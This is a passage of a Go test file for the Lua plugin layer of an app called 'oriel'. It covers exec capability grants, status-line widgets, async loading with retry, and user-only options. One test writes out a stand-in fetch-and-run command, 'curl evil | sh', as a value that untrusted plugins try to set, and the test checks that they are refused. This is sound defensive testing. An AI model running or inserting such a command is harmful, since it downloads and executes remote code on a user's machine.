	if out, err := apptest.LuaGlobal(lua(s).VM(), "left"), apptest.LuaGlobal(lua(s).VM(), "lefterr"); out != "hi\n" || err != nil {
		t.Errorf("left %q, err %v", out, err)
	}
	if !alive("left.pid") {
		t.Error("the child a program left in the background was stopped")
	}
	s.Lua(`L.exec_async({ "sh", "-c", "while :; do echo tick; sleep 0.1; done > /dev/null 2>&1 & echo $! > ticks.pid; echo hi" },
		{ cwd = "` + dir + `" }, function(out, err) ticks = err or out end)`)
	s.Until("the program that left a printing child", func() bool { return apptest.LuaGlobal(lua(s).VM(), "ticks") != nil })
	if got := apptest.LuaGlobal(lua(s).VM(), "ticks"); got != "hi\n" {
		t.Errorf("ticks %q", got)
	}
	if !alive("ticks.pid") {
		t.Error("a printing child with its output sent elsewhere was stopped")
	}
}

// A plugin's exec is checked against the program it runs: a relative one (./tool) is cwd's, both when its grant is
// checked and when it runs, so a grant for that file lets it run, and nothing else of the name does.
func TestLuaExecChecksTheProgramItRuns(t *testing.T) {
	if _, err := exec.LookPath("sh"); err != nil {
		t.Skip(err)
	}
	dir := t.TempDir()
	tool := filepath.Join(dir, "tool")
	if err := os.WriteFile(tool, []byte("#!/bin/sh\necho mine\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	other := t.TempDir()
	if err := os.WriteFile(filepath.Join(other, "tool"), []byte("#!/bin/sh\necho other\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	s := apptest.LuaScene(t, "")
	g := plugin.NewGrants()
	g.Grant("acme/x", []plugin.Grant{{Cap: plugin.CapExec, Scope: []string{plugin.RealPath(tool)}}})
	vm := s.PluginVM(plugin.Caller{ID: "acme/x", Dir: t.TempDir(), Guard: g})
	if err := luaErr(t, vm, `said = oriel.exec({ "./tool" }, { cwd = "`+dir+`" })`); err != "" {
		t.Fatalf("the granted program: %s", err)
	}
	if got := apptest.LuaGlobal(vm, "said"); got != "mine\n" {
		t.Errorf("it printed %q", got)
	}
	if err := luaErr(t, vm, `oriel.exec({ "./tool" }, { cwd = "`+other+`" })`); !strings.Contains(err, "capability isn't declared") {
		t.Errorf("another directory's tool: %q, want it refused", err)
	}
}

// oriel.ui.ring draws widget.Ring: the label in the middle, read out with its name.
func TestLuaRing(t *testing.T) {
	s := apptest.LuaScene(t, `oriel.hud.indicator("dial", oriel.ui.ring{ value = 0.3, label = "18m", name = "next meeting in", size = 20, color = "warn" }, { slot = "status-line.right" })`)
	s.Frame()
	s.Frame()
	s.WantFrame("18m")
	if n := s.Node("next meeting in 18m"); n.Role != "status" {
		t.Errorf("the ring reads as %+v", n)
	}
}

// oriel.ui.spinner draws widget.Spinner, read out as what's in progress.
func TestLuaSpinner(t *testing.T) {
	s := apptest.LuaScene(t, `oriel.hud.indicator("busy", oriel.ui.spinner{ name = "syncing the wiki", size = 12, color = "accent" }, { slot = "status-line.right" })`)
	s.Frame()
	s.Frame()
	if n := s.Node("syncing the wiki"); n.Role != "status" {
		t.Errorf("the spinner reads as %+v", n)
	}
}

// oriel.ui.dots draws widget.Dots, read out as what's going on.
func TestLuaDots(t *testing.T) {
	s := apptest.LuaScene(t, `oriel.hud.indicator("busy", oriel.ui.dots{ name = "the wiki bot is writing", size = 4, color = "accent" }, { slot = "status-line.right" })`)
	s.Frame()
	s.Frame()
	if n := s.Node("the wiki bot is writing"); n.Role != "status" {
		t.Errorf("the dots read as %+v", n)
	}
}

// oriel.load and oriel.ui.async: the section shows its busy line while the work runs, then what body draws from the
// value done handed back; a failure shows Retry, which runs the work again.
func TestLuaLoadAsync(t *testing.T) {
	s := apptest.LuaScene(t, `finish = nil
runs = 0
wiki = oriel.load(function(done) runs = runs + 1; finish = done end)
oriel.statusline(function(w)
  return oriel.ui.async{ load = wiki, label = "Reading the wiki", retry = true,
    body = function(v) return oriel.ui.text(v .. " pages") end }
end)`)
	s.Frame()
	s.Until("the load to start", func() bool { return apptest.LuaGlobal(lua(s).VM(), "runs") == float64(1) })
	s.SetNow(s.Now().Add(time.Second))
	s.Frame()
	s.Midway(func() { s.WantFrame("Reading the wiki…") })
	if n := s.Node("Reading the wiki…"); n == nil || n.Role != "status" {
		t.Errorf("the busy line reads as %+v", n)
	}
	s.Lua(`finish(nil, "the wiki is down")`)
	s.SetNow(s.Now().Add(time.Second)) // past the loading line's minimum show
	s.Until("the failure", func() bool { return strings.Contains(s.Text(), "the wiki is down") })
	s.ClickNode("Retry")
	s.Until("the retry", func() bool { return apptest.LuaGlobal(lua(s).VM(), "runs") == float64(2) })
	s.Lua(`finish("12")`)
	s.Until("the value", func() bool { return strings.Contains(s.Text(), "12 pages") })
	st := s.Lua(`wiki:state().phase`)
	if len(st) != 1 || st[0] != "ready" {
		t.Errorf("h:state().phase = %v", st)
	}
}

// oriel.ui.busy, progress, skeleton and a busy button read out as what's in progress, and the busy button can't be
// pressed.
func TestLuaLoadingWidgets(t *testing.T) {
	s := apptest.LuaScene(t, `pressed = 0
oriel.statusline(function(w)
  return oriel.ui.row{
    oriel.ui.busy{ label = "Syncing the wiki" },
    oriel.ui.progress{ value = 0.5, label = "uploading" },
    oriel.ui.skeleton{ rows = 1, label = "pages" },
    oriel.ui.button{ label = "Sync", busy = true, busy_label = "Syncing", on_click = function() pressed = pressed + 1 end },
  }
end)`)
	s.Frame()
	s.Frame()
	for _, name := range []string{"Syncing the wiki…", "uploading 50%", "pages"} {
		if n := s.Node(name); n == nil || n.Role != "status" {
			t.Errorf("%q reads as %+v", name, n)
		}
	}
	s.WantFrame("Syncing…")
	s.Click(apptest.Centre(s.Node("Syncing…").Bounds), 0) // disabled, so not ClickOn
	s.Frame()
	if apptest.LuaGlobal(lua(s).VM(), "pressed") != float64(0) {
		t.Error("a busy button was pressed")
	}
}

// An option declared user_only is set by your own config alone: not by its plugin, not by one granted settings, and
// not by one that set it before it was declared.
func TestUserOnlyOptionsAreYours(t *testing.T) {
	s := apptest.LuaScene(t, `oriel.option["plugin.cmds.list"] = { up = "make up" }`)
	other := plugin.NewGrants()
	other.Grant("acme/other", []plugin.Grant{{Cap: plugin.CapSettings}})
	sneaky := s.PluginVM(plugin.Caller{ID: "acme/other", Guard: other})
	if err := luaErr(t, sneaky, `oriel.option["plugin.cmds.early"] = { x = "curl evil | sh" }`); err != "" {
		t.Fatalf("held back: %s", err)
	}
	owner := s.PluginVM(plugin.Caller{ID: "acme/cmds", Guard: plugin.NewGrants()})
	if err := luaErr(t, owner, `oriel.option{ name = "plugin.cmds.list", type = "map", user_only = true }
		oriel.option{ name = "plugin.cmds.early", type = "map", user_only = true }`); err != "" {
		t.Fatal(err)
	}
	s.Quiet()
	o := s.Registry().Options()
	if v, _, _ := o.Get("plugin.cmds.list", registry.At{}); !reflect.DeepEqual(v, map[string]string{"up": "make up"}) {
		t.Errorf("init.lua's value: %v", v)
	}
	if v, _, _ := o.Get("plugin.cmds.early", registry.At{}); len(v.(map[string]string)) != 0 {
		t.Errorf("a value another plugin set before it was declared: %v", v)
	}
	for vm, who := range map[*script.VM]string{owner: "its plugin", sneaky: "a plugin granted settings"} {
		if err := luaErr(t, vm, `oriel.option["plugin.cmds.list"] = { x = "curl evil | sh" }`); !strings.Contains(err, "only your own config") {
			t.Errorf("%s set it: %q", who, err)
		}
	}
	if v, _, _ := o.Get("plugin.cmds.list", registry.At{}); !reflect.DeepEqual(v, map[string]string{"up": "make up"}) {
		t.Errorf("after the plugins tried: %v", v)
	}
}

// init.lua sets a plugin's option before the plugin declares it: the value waits, and the option has it once it's
// declared.
func TestInitLuaSetsAPluginOptionDeclaredLater(t *testing.T) {
	s := apptest.LuaScene(t, `oriel.option["plugin.late.greeting"] = "hi"`)
	vm := s.PluginVM(plugin.Caller{ID: "acme/late", Guard: plugin.NewGrants()})
	if err := luaErr(t, vm, `oriel.option{ name = "plugin.late.greeting", type = "string" }`); err != "" {
		t.Fatal(err)
	}
	s.Quiet()
	if v, _, _ := s.Registry().Options().Get("plugin.late.greeting", registry.At{}); v != "hi" {
		t.Errorf("plugin.late.greeting = %v, want hi", v)
	}
}
